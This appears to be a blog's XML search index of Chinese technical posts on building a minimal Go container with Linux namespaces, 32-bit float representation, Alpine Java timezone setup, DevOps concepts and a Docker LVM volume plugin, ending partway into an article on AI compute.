<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>100 行代码创建一个容器</title>
    <url>/2020/12/23/100-%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8/</url>
    <content><![CDATA[<p>容器占用资源监控和故障隔离，训练性能不一致</p>
<h3 id="关键技术一：命名空间"><a href="#关键技术一：命名空间" class="headerlink" title="关键技术一：命名空间"></a>关键技术一：命名空间</h3><ol>
<li>PID：PID命名空间为某个进程及其子进程提供了系统中进程的一个子集的视图。你可以将其想象为一个映射表。当PID命名空间中的某个进程向kernel请求一个进程列表时，kernel将会检查这个映射表。如果该进程已经存在于表中，那么kernel就会返回其映射ID，而不是真实的ID。而如果该进程不存在于映射表中，那么kernel会假设该进程完全不存在。在PID命名空间中创建的第一个进程的pid为1（因此其主机ID的映射值为1），该命名空间在容器中会表现为一个隔离的进程树。</li>
<li>MNT：在某种意义上说，mount命名空间是最重要的一个命名空间，它为其中所包含的进程提供了一个独有的mount表。这也意味着当这些进程对目录进行挂载或取消挂载时不会影响其他命名空间（包括主机命名空间）。更重要的是，我们将看到，<font size="8">通过与pivot_root这个系统调用的结合，它让某个进程能够拥有一个独有的文件系统</font>。因此，只需交换容器的文件系统，进程就会认为它正运行在某个Ubuntu、BusyBox或Alpine中。</li>
<li>NET：network命名空间为使用它的进程赋予了独立的网络栈。通常来说，只有在主network命名空间（也就是当机器启动时会自动启动的进程所在的命名空间）中才会被分配真实的物理网卡。但我们可以创建虚拟的网络设备对，即互联的网卡，其中一端属于某个network命名空间，而另一端则属于另一个network命名空间，通过这种方式在两个network命名空间之间创建了一个虚拟的连接。这种方式有些类似于在同一台主机中让多个IP栈进行通信。通过一定的路由逻辑，每个容器就能够保持自己独立的网络栈，同时能够与外界进行通信。</li>
<li>UTS：UTS（UNIX Time-sharing System）命名空间为其中的进程提供了系统主机名与域名的独有视图。当进入某个UTS命名空间之后，对于主机名与域名的修改不会影响其他进程。</li>
<li>IPC：IPC（Interprocess Communication）命名空间能够隔离各种进程间的通信机制，例如消息队列等等。可参考命名空间的相关文档，以了解更多细节。</li>
<li>USER：user命名空间最近刚刚得到支持，从安全性的角度来看，它可能是最强大的一种命名空间了。user命名空间能够将某个进程所看到的uid映射为主机中一个不同的uid（以及gid）集合。这一特性非常实用，通过使用user命名空间，我们就能够将容器的root user ID（比如0）映射为主机中一个任意的（并且未赋予特权的）uid。这就意味着我们可以让某个容器认为它具有对root的访问权，而同时又无需为其赋予任何root命名空间中的权限（我们甚至可以为其访问特定于容器的资源赋予类似于root的权限）。容器可随意以uid 0运行进程（这通常意味着该用户具备root权限），而kernel会在内部将该uid映射为某个未赋予特权的真实uid。大多数容器系统都不会将容器中的任何一个uid映射为调用命名空间中的uid 0，换句话说，在容器中不存在任何一个具有root权限的uid。</li>
</ol>
<h3 id="关键技术二：-cgroups"><a href="#关键技术二：-cgroups" class="headerlink" title="关键技术二： cgroups"></a>关键技术二： cgroups</h3><p>Cgroups全称Control Groups，是Linux内核提供的物理资源隔离机制，通过这种机制，可以实现对Linux进程或者进程组的资源限制、隔离和统计功能。比如可以通过cgroup限制特定进程的资源使用，比如使用特定数目的cpu核数和特定大小的内存，如果资源超限的情况下，会被暂停或者杀掉。Cgroup是于2.6内核由Google公司主导引入的，它是Linux内核实现资源虚拟化的技术基石，LXC(Linux Containers)和docker容器所用到的资源隔离技术，正是Cgroup。</p>
<p>cgroup 内容很多，具体可以参见<a href="https://zhuanlan.zhihu.com/p/81668069" target="_blank" rel="noopener">这里</a></p>
<h3 id="关键技术三：-分层文件系统"><a href="#关键技术三：-分层文件系统" class="headerlink" title="关键技术三： 分层文件系统"></a>关键技术三： 分层文件系统</h3><p>命名空间与CGroups负责容器化的隔离与资源共享，他们实现了容器的主体功能以及安全保障。而分层文件系统使我们能够高效地移动完整的机器镜像，它保证了容器的持续运作。从本质上来看，分层文件系统的作用是使为每个容器创建一份root文件系统的拷贝的调用过程进行优化。有多种不同的方式可以实现这一目标。Btrfs在文件系统层使用了写时拷贝（copy-on-write）技术，而Aufs则使用了“union mounts”这种挂载机制。由于可以通过多种方式实现这一步骤，因此本文选择了一种非常简单的方式：我们将真正地创建一个拷贝。虽然这种方式很慢，但确实能够完成任务。</p>
<h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">    <span class="string">"os/exec"</span></span><br><span class="line">    <span class="string">"syscall"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> os.Args[<span class="number">1</span>] &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"run"</span>:</span><br><span class="line">        parent()</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"child"</span>:</span><br><span class="line">        child()</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"wat should I do"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># step <span class="number">1</span> ‘/proc/self/exe’，这是一个特殊文件，它包含了当前可执行文件的一个内存镜像。换句话说，我们将重新调用这个程序本身，将‘child’作为第一个参数进行传递</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parent</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">"/proc/self/exe"</span>, <span class="built_in">append</span>([]<span class="keyword">string</span>&#123;<span class="string">"child"</span>&#125;, os.Args[<span class="number">2</span>:]...)...)</span><br><span class="line">    # step <span class="number">2</span> 在程序中添加命名空间</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;</span><br><span class="line">        Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS,</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ERROR"</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">child</span><span class="params">()</span></span> &#123;</span><br><span class="line">    # step3 第<span class="number">2</span>步中已经将该进程运行在了新的mnt命名空间，此处进行rootfs 的切换</span><br><span class="line">    must(syscall.Mount(<span class="string">"rootfs"</span>, <span class="string">"rootfs"</span>, <span class="string">""</span>, syscall.MS_BIND, <span class="string">""</span>))</span><br><span class="line">    must(os.MkdirAll(<span class="string">"rootfs/oldrootfs"</span>, <span class="number">0700</span>))</span><br><span class="line">    must(syscall.PivotRoot(<span class="string">"rootfs"</span>, <span class="string">"rootfs/oldrootfs"</span>))</span><br><span class="line">    </span><br><span class="line">    # 当‘pivotroot’调用 结束之后，容器中的‘/’目录将指向rootfs目录</span><br><span class="line">    must(os.Chdir(<span class="string">"/"</span>))</span><br><span class="line"></span><br><span class="line">    cmd := exec.Command(os.Args[<span class="number">2</span>], os.Args[<span class="number">3</span>:]...)</span><br><span class="line">    cmd.Stdin = os.Stdin</span><br><span class="line">    cmd.Stdout = os.Stdout</span><br><span class="line">    cmd.Stderr = os.Stderr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ERROR"</span>, err)</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">must</span><span class="params">(err error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>32位浮点数</title>
    <url>/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/</url>
    <content><![CDATA[<p>在AI中常提32位浮点数、16位浮点数，混合精度。。这里重点说一下32位浮点数的表示<br>先来一张图</p>
<p>  <img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/32.png" alt="avatar"></p>
<p>浮点数的计算方式<br><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/1.png" alt="avatar"><br>其中s是符号位，e是指数位，m是有效数位组成的数。<br>m的计算方式是<br><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/2.png" alt="avatar"></p>
<p>所以上图表示的数字就是<br><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/3.png" alt="avatar"></p>
<p>采用这种表示方式的结果是，两个浮点数之间的“间隔”是均匀的。什么意思？</p>
<p>比如说，我想表示浮点数1的话，那么我的二进制位就是：</p>
<p><code>0 01111111 00000000000000000000000</code></p>
<p>我想表示2的话，二进制位就是</p>
<p><code>0 10000000 0000000000000000000000</code></p>
<p>1和2之间，我能表示的数是有限的，比1大的浮点数，最小的值我只能取到</p>
<p><code>0 01111111 00000000000000000000001</code></p>
<p>也就是上述的m是2的-23次方，这就是浮点数的“精度”,于是，你可以看到c++标准库中有一个这个函数：</p>
<p><code>std::numeric_limits&lt;float&gt;::epsilon()</code></p>
<p>这个值就是2的-23次方！</p>
<p>还有一点，很明显，用上面的式子，我们没法把值精确地表示0，这显然是无法接受的。于是浮点标准就对e=0的情况做了额外的规定，也就是说当e等于0的时候浮点值就不是乘以1.m，而是乘以0.m。也就是说，如果有效值m是0的话，那么浮点值表示的数字就是0，没有歧义！</p>
<p>接着，如果1.m的1没有的话，我们能表示的最小的值就是0.000…1(2进制)*2(-126)，也就是2(-126) * 2^(-23)，大约是1.4012985 * 10 ^ (-45)。</p>
<p>我用下面的代码尝试做了输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">std::cout.precision(15);</span><br><span class="line"></span><br><span class="line">uint8_t array[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array[3] &#x3D; 0x3F; array[2] &#x3D; 0x80;</span><br><span class="line">float* f &#x3D; reinterpret_cast&lt;float*&gt;(array);</span><br><span class="line">std::cout &lt;&lt; &quot;f &#x3D; &quot; &lt;&lt; *f &lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">uint8_t array1[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array1[3] &#x3D; 0x3F; array1[2] &#x3D; 0x80; array1[0] &#x3D; 0x1;</span><br><span class="line">float* f1 &#x3D; reinterpret_cast&lt;float*&gt;(array1);</span><br><span class="line">std::cout &lt;&lt; &quot;f1 &#x3D; &quot; &lt;&lt; *f1 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">uint8_t array2[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array2[2] &#x3D; 0x7F; array2[1] &#x3D; 0xFF; array2[0] &#x3D; 0xFF;</span><br><span class="line">float* f2 &#x3D; reinterpret_cast&lt;float*&gt;(array2);</span><br><span class="line">std::cout &lt;&lt; &quot;f2 &#x3D; &quot; &lt;&lt; *f2 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">uint8_t array3[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array3[0] &#x3D; 0x1;</span><br><span class="line">float* f3 &#x3D; reinterpret_cast&lt;float*&gt;(array3);</span><br><span class="line">std::cout &lt;&lt; &quot;f3 &#x3D; &quot; &lt;&lt; *f3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>
<p>结果是：<br><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/4.png" alt="avatar"></p>
<p>与预想的一致。</p>
<p>最后，IEEE 754标准保证-0.0严格等于0.0！</p>
<p>如果e等于255，这种情况同样会被特殊处理。e=255，m=0的话，这就表示无限大，用cout输出就是inf。但如果e=255，m!=0的话，那么这就是一个无效值，输出的结果是nan，尝试代码和结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uint8_t array4[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array4[3] &#x3D; 0x7F; array4[2] &#x3D; 0x80;</span><br><span class="line">float* f4 &#x3D; reinterpret_cast&lt;float*&gt;(array4);</span><br><span class="line">std::cout &lt;&lt; &quot;f4 &#x3D; &quot; &lt;&lt; *f4 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">uint8_t array5[4] &#x3D; &#123;0&#125;;</span><br><span class="line">array5[3] &#x3D; 0x7F; array5[2] &#x3D; 0x80; array5[0] &#x3D; 0x3F;</span><br><span class="line">float* f5 &#x3D; reinterpret_cast&lt;float*&gt;(array5);</span><br><span class="line">std::cout &lt;&lt; &quot;f5 &#x3D; &quot; &lt;&lt; *f5 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/5.png" alt="avatar"></p>
<p>于是，我们能表示的最大有效值是1.1111111(二进制）* 2 ^ 127，也就是3.402823… * 10^38。测试代码和结果如下：</p>
<pre><code>uint8_t array6[4] = {0};
array6[3] = 0x7F; array6[2] = 0x7F; array6[1] = 0xFF; array6[0] = 0xFF;
float* f6 = reinterpret_cast&lt;float*&gt;(array6);
std::cout &lt;&lt; &quot;f6 = &quot; &lt;&lt; *f6 &lt;&lt; std::endl;</code></pre>
<p><img src="/2022/07/21/32%E4%BD%8D%E6%B5%AE%E7%82%B9%E6%95%B0/6.png" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>Alpine镜像内的Java时区问题</title>
    <url>/2020/09/04/Alpine%E9%95%9C%E5%83%8F%E5%86%85%E7%9A%84Java%E6%97%B6%E5%8C%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>docker的精简镜像alpine内没有时区信息，在基于该镜像制作应用镜像时，需要配置时区信息，之前的做法是在其他容器时将宿主机的时区配置挂载到容器，如下所示：</p>
<p>docker run -itd -v /etc/localtime:/etc/localtime alpine bash<br>进入到容器内，时间确实已经是东八区时间:</p>
<p>bash-4.3# date<br>Tue Aug  7 09:32:21 CST 2018<br>但是对于Java应用来说，读取到的时间依然不是东八区时间，还需要挂载下面的时区文件才可以</p>
<p>docker run -itd -v /etc/localtime:/etc/localtime -v /etc/timezone:/etc/timezone alpine bash<br>附 Java读取系统时区配置</p>
<p>方法一</p>
<p>在 tomcat的jvm 运行参数加上 -Duser.timezone=GMT+8，使用该配置，应用程序就会忽略系统设置的时区</p>
<p>方法二</p>
<p>配置文件/etc/sysconfig/clock，在文件内增加以下信息</p>
<p>ZONE=”Asia/Shanghai”<br>UTC=false<br>ARC=false<br>方法三</p>
<p>配置时区:</p>
<p>cp /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime<br>echo “Asia/Shanghai”&gt;&gt;/etc/timezone</p>
]]></content>
  </entry>
  <entry>
    <title>DevOps 理解整理</title>
    <url>/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="传统的软件开发流程"><a href="#传统的软件开发流程" class="headerlink" title="传统的软件开发流程"></a>传统的软件开发流程</h1><p><img src="/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/uploads/image/20170922/1506070794227148.png" alt="image.png" title="1506070794227148.png"></p>
<p>  存在的问题：</p>
<p>1、 资源获取和环境准备效率低，缺少标准化化、自主的化的服务能力</p>
<p>2、 从代码开发到环境运行的流程不顺畅，开发人员不清楚最终的软件会如何部署和运行，测试人员不了解软件测试的重点和风险点在什么地方，运维人员不清楚软件架构的高可用设计是如何实现的，部门之间基本靠非常零碎、极易过时的文档或者口头沟通来交换信息</p>
<p>在产品研发的起始阶段，忙于需求分析、架构设计、代码实现，以上两个问题被大多数人认为比较容易处理。等到快上线的时候，出现上线失败或者临时方案上线</p>
<h1 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h1><p>DevOps理念： 提倡开发、测试、IT运维之间的高度协同，从而完成高频率部署的同时，提高生产环境的可靠性、稳定性、弹性、安全性</p>
<p>开发与IT运维：产品的价值在于业务（定义需求）和客户（交付价值）之间</p>
<p>DevOPs本身不能完全被工具和软件来简单的定义和量化，但工具和软件是实现DevOps的一个重要组成部分 </p>
<p>解决的问题：</p>
<p>1、 一些关于产品改善和创新的想法很难落地，设计到一些遗留系统的配合：调整、部署、扩展。新的服务或者应用构建、很难快速上线，被卡在了生产环境部署阶段</p>
<p>2、 不同种类的应用、服务的部署方式和流程不一致，运维团队很难为大量不同技术栈的团队提供快速响应。</p>
<p>3、 微服务的兴起，交付团队难以做到快速集成和部署。运维团队对微服务的部署方式不理解，不能适配新架构下的交付模式，开发团队大多关注代码和架构，对于产品如何在能在生产环境稳定运行、需要考虑哪些安全性和可持续性的因素并不是很了解。开发阶段，系统的架构和依赖环境都是开发者决定，对生产环境的关注度不高。部署、发布阶段，运维人员会考虑如何构建一套稳定的基础设施，又如何去部署和运维开发的产品。</p>
<h2 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h2><p>持续集成是一种软件项目管理方法，依据资产库（源码、类库）等的变更自动完成编译、测试、部署和反馈。持续集成已经广泛用于现代软件开发流程中，能够带来的好处：快速发现错误和促进代码分支的集成。</p>
<p>带来的价值：</p>
<p>   1、提高软件质量：每天或者每周进行多次集成，并进行测试，有利于发现软件缺陷，最终提高软件质量</p>
<p>   2、减少重复劳动：自动化工具编译代码、打包、上传、部署、测试，无需太多人工干预，让开发者更多精力专注于软件逻辑实现</p>
<p>   3、增强项目的预见性：每次操作会记录详细的输入输出结果，为后续产品缺陷是否收敛提供数据支撑。通过这些数据分析增加项目的预见性。</p>
<p>  4、增强团队对产品的信息</p>
<p>如何做到产品的持续集成</p>
<p>1、 统一代码库</p>
<p>2、 自动构建工具</p>
<p>3、 自动测试脚本</p>
<p>4、 开发向代码库主干提交代码</p>
<p>5、 自动触发构建工具</p>
<p>6、 高速构建服务器、快速完成构建作业</p>
<p>7、 上传软件到测试环境触发自动测试脚本</p>
<p>8、 执行结果分析与展示</p>
<p>9、 自动部署到演练环境</p>
<p><img src="/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/uploads/image/20170922/1506070830595640.png" alt="image.png" title="1506070830595640.png"></p>
<p>                                                                                                  持续集成流程</p>
<h2 id="持续交付"><a href="#持续交付" class="headerlink" title="持续交付"></a>持续交付</h2><p>持续交付是指周期性地将新版本软件交给质量运营团队或者用户，测试与评审。如果代码通过评审，代码进入生产阶段，持续交付的核心是不管有多少更新，软件始终可以交付价值</p>
<p>1、 快速发布产品特性：缩短编码、测试、上线、交付的迭代周期，使每个步骤出现的问题得到快速响应，在产品上的体现就是缩短软件功能发布周期，从而可以更好的应对业务需求的变化</p>
<p>2、 高质量的软件发布标准：软件交付过程实现标准化，整个交付过程可重复，过程进度可视化</p>
<p>3、 提供团队协作效率</p>
<p><img src="/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/uploads/image/20170922/1506070853309847.png" alt="image.png" title="1506070853309847.png"></p>
<p>                                                                                               持续交付流程</p>
<h2 id="灰度发布"><a href="#灰度发布" class="headerlink" title="灰度发布"></a>灰度发布</h2><p>1、负载均衡</p>
<p>2、升级回滚</p>
<p>灰度发布本质是选取部分用户或者区域发布产品新特性。A/B测试安一定的策略选定一部分用户继续用A，而另一部分用户开始用B，产品可以通过使用B的用户反馈决策是否扩大发布范围，最终达到产品新特性向所有用户全量发布</p>
<h2 id="应用编排"><a href="#应用编排" class="headerlink" title="应用编排"></a>应用编排</h2><p>应用通常有多个组件或者模块，基于Kubernetes 部署应用</p>
<h2 id="DevOps流水线"><a href="#DevOps流水线" class="headerlink" title="DevOps流水线"></a>DevOps流水线</h2><p> <img src="/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/1506070880431917.png" alt="avatar"><br>  <img src="/2020/09/21/DevOps-%E7%90%86%E8%A7%A3%E6%95%B4%E7%90%86/1506070894349245.png" alt="avatar"></p>
<h2 id="DevOps与Kubernetes"><a href="#DevOps与Kubernetes" class="headerlink" title="DevOps与Kubernetes"></a>DevOps与Kubernetes</h2><h3 id="Kubernetes对DevOps的影响"><a href="#Kubernetes对DevOps的影响" class="headerlink" title="Kubernetes对DevOps的影响"></a>Kubernetes对DevOps的影响</h3><p>DevOps并不是一个新概念，前期是没有好的工具来辅助DevOps的发展，虚拟机、IAAS管理不能解决应用管理的多样化需求。</p>
<p>应用管理的需求：</p>
<p>1、 应用运行环境、应用版本功能的不确定性，导致运维需要适配不同的运行环境，定制多种应用编译部署脚本，容器的出现解决了这个问题</p>
<p>2、 基于容器的应用不断增多，产生了对容器集群管理的需求—Kubernetes</p>
<p>3、应用升级回滚对容器集群管理的需求—Kubernetes</p>
<p>  4、应用的生命周期管理可以完全由Kubernetes管理，用户将更多精力放到代码开发</p>
<h3 id="持续集成工具Jenkis与Kubernetes"><a href="#持续集成工具Jenkis与Kubernetes" class="headerlink" title="持续集成工具Jenkis与Kubernetes"></a>持续集成工具Jenkis与Kubernetes</h3><p> Jenkins与Kubernetes结合：基于Kubernetes部署Jenkins Master。在Jenkins Master 安装Kubernetes Plugin，并下载Jenkins Slave 镜像。Jenkins的任务通过Jenkins Plugin 转化为Kubernetes Pod 模板，Kubernetes 根据Pod 模板自动拉起Slave容器，Slave容器会自动加入Jenkins 集群。Jenkins 执行任务时，自动调度Job到某个Slave容器，任务结束后，Jenkins自动删除相关街道，并销毁对应容器，实现资源释放。</p>
]]></content>
  </entry>
  <entry>
    <title>docker Volume Plugin 开发及Golang实现</title>
    <url>/2020/09/21/Docker-Volume-Plugin-%E5%BC%80%E5%8F%91%E5%8F%8AGolang%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>      该项目要用于生产环境了，完善加固了一下代码，顺便更新一下文章。</p>
<p>     在加固项目的代码时候 ，调整了卷创建的顺序，调用docker volume create的时候，就把lv创建出来，并挂载到了本地目录，中间遇到了一个很奇怪的问题，挂载lv代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">err &#x3D; syscall.Mount(lvdiskname, mountPoint, &quot;xfs&quot;, syscall.MS\_NOSUID|syscall.MS\_STRICTATIME, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		log.Error(&quot;mount lv failed&quot;, err)</span><br><span class="line">			return volume.Response&#123;Err: &quot;mount lv failed&quot;&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>      使用该代码挂载完成后，在命令行执行df -h 命令是无法查看到挂载信息的，代码也没有报错，尝试把lv删除时，会出现 Device busy的错误。数据并没有丢失，可以在容器内正常使用。</p>
<p>google到了 mount namespace的概念。</p>
<p>``<br>     mnt namespace为进程提供独立的文件系统视图。当clone（）函数中带有CLONE_NEWNS标志时，新的mnt ns在子进程中被创建，新的mnt ns是一份父mnt ns的拷贝，<br>但是在子进程中调用mount安装的文件系统，将独立于父进程的mnt ns，只出现在新的mnt ns上<br>使用syscall.Mount 函数应该是在另一个namespace 中进行了挂载，因此我是无法查看到。</p>
<p>    前期的项目需求，需要合理利用宿主机的存储，利用在宿主机部署Agent的方式，实现了基于LVM分配docker数据卷的方式，随着开发的进行，项目想要集成docker compose 完成应用的自动编排，需要在docker compose中为容器创建数据卷并且指定卷大小，之前的采用agent的模式已经无法满足目前的需求。参考<a href="https://docs.docker.com/engine/extend/plugins_volume/" target="_blank" rel="noopener">docker 官方文档</a> 和 <a href="https://github.com/CWSpear/local-persist" target="_blank" rel="noopener">Local-Persist</a>项目，实现了一个基于LVM的volume 插件 <a href="https://github.com/davidstack/docker-volume-plugin-lvm" target="_blank" rel="noopener">docker-volume-plugin-lvm</a>。</p>
<p>      docker Volume Plugin 提供了标准的卷管理API，第三方只需要实现这些API就可以了。</p>
<p>     插件加载方式，将自己实现的Driver注册，启动main函数，实际上是启动了一个监听端口，sock文件：/var/run/docker/plugins/LVM.sock</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func main() &#123;</span><br><span class="line">	driver :&#x3D; NewLvmPersistDriver()</span><br><span class="line"></span><br><span class="line">	handler :&#x3D; volume.NewHandler(driver)</span><br><span class="line">	fmt.Println(handler.ServeUnix(&quot;root&quot;, driver.Name))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 查询卷API：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (driver \*LvmPersistDriver) Get(req volume.Request) volume.Response</span><br></pre></td></tr></table></figure>





<p>       创建卷API：根据入参获取卷名称和卷大小，在LVM的VG中分配LV，并将卷的元数据保存到内存并持久化，若没有设置卷大小，可以设置默认值（目前只能通过代码修改） PS：在使用docker create 命令创建容器时，无法指定卷大小比较坑，还好docker compose支持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (driver \*LvmPersistDriver) Create(req volume.Request) volume.Response</span><br><span class="line">&#96;&#96;&#96;    挂载卷API：根据入参获取卷名称，校验该卷是否已经存在，若存在，将该LV格式化，并挂载到宿主机的目录（宿主机目录由卷插件指定）（若宿主机目录已经被挂载，则不执行该步骤），将挂载点，也就是宿主机目录以volume.Response的方式返回，PS：支持多个容器挂载同一个数据卷，但是读写控制目前没有实现，需要Container自己控制。</span><br></pre></td></tr></table></figure>
<p>func (driver *LvmPersistDriver) Mount(req volume.Request) volume.Response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  卸载卷API：</span><br></pre></td></tr></table></figure>
<p>func (driver *LvmPersistDriver) Unmount(req volume.Request) volume.Response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">删除卷API：</span><br></pre></td></tr></table></figure>
<p>func (driver *LvmPersistDriver) Remove(req volume.Request) volume.Response</p>
<p>```<br>具体实现可以参考代码实现。<a href="https://github.com/davidstack/docker-volume-plugin-lvm" target="_blank" rel="noopener">docker-volume-plugin-lvm</a></p>
<p>代码目前不是很完善，测试代码，部署运行代码 还没有实现。我比较懒。。。</p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>golang</tag>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>AI算力加速之道</title>
    <url>/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/</url>
    <content><![CDATA[<h1 id="1-AI算力发展趋势"><a href="#1-AI算力发展趋势" class="headerlink" title="1. AI算力发展趋势"></a>1. AI算力发展趋势</h1><h2 id="1-1-人工智能理论：深度学习"><a href="#1-1-人工智能理论：深度学习" class="headerlink" title="1.1 人工智能理论：深度学习"></a>1.1 人工智能理论：深度学习</h2><p>人工智能发展至今并非一帆风顺， 从起步阶段到现今的深度学习阶段，数据、算法和算力构成了人工智能三大基本要素，共同推动人工智能向更高层次的感知、认知发展。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/1.png" alt="avatar"></p>
<h2 id="1-2-第三次人工智能浪潮代表人物"><a href="#1-2-第三次人工智能浪潮代表人物" class="headerlink" title="1.2 第三次人工智能浪潮代表人物"></a>1.2 第三次人工智能浪潮代表人物</h2><p>如前所述，当前人工智能繁荣离不开数据、算法和算力的共同发展，在算法层面，深度学习三巨头Geoffrey Hinton、Yann LeCun和Yoshua Bengio对AI领域的贡献无人不知、无人不晓，他们围绕神经网络重塑了AI；</p>
<p>数据层面，2007年李飞飞创建了世界上最大的图像识别数据库ImageNet，使人们认识到了数据对深度学习的重要性，也正是因为通过ImageNet识别大赛，才诞生了AlexNet, VggNet, GoogleNet, ResNet等经典的深度学习算法。</p>
<p>前几次人工智能繁荣后又陷入低谷，一个核心的原因就是算力难以支撑复杂的算法，而简单的算法效果又不佳。黄仁勋创办的NVIDIA公司推出的GPU，很好的缓解了深度学习算法的训练瓶颈，释放了人工智能的全新潜力。</p>
<p><img src="/2022/07/21/AI%E7%AE%97%E5%8A%9B%E5%8A%A0%E9%80%9F%E4%B9%8B%E9%81%93/2.png" alt="avatar"></p>
<h2 id="1-3-计算力就是生产力"><a href="#1-3-计算力就是生产力" class="headerlink" title="1.3 计算力就是生产力"></a>1.3 计算力就是生产力</h2><p>在智慧时代，计算力就是生产力。什么是生产力，就是人类改造自然的能力，就是创造价值的能力。在这个表中，我们有一个很有趣的发现。</p>
<p>在10年前，全球市值最高的企业大部分是能源公司、金融企业，市值靠前的IT公司仅仅微软一家，那时候windows如日中天，office独步天下，属于个人PC时代。</p>
<p>到了当前，全球最值钱的公司几乎清一色的信息技术与服务公司，有趣的地方还不在这里，这前几名的公司正好也是全球采购服务器最多公司，仅亚马逊一家，2017年便采购了全球13%的云服务器。是海量的计算能力在为这些公司创造价值。</p>
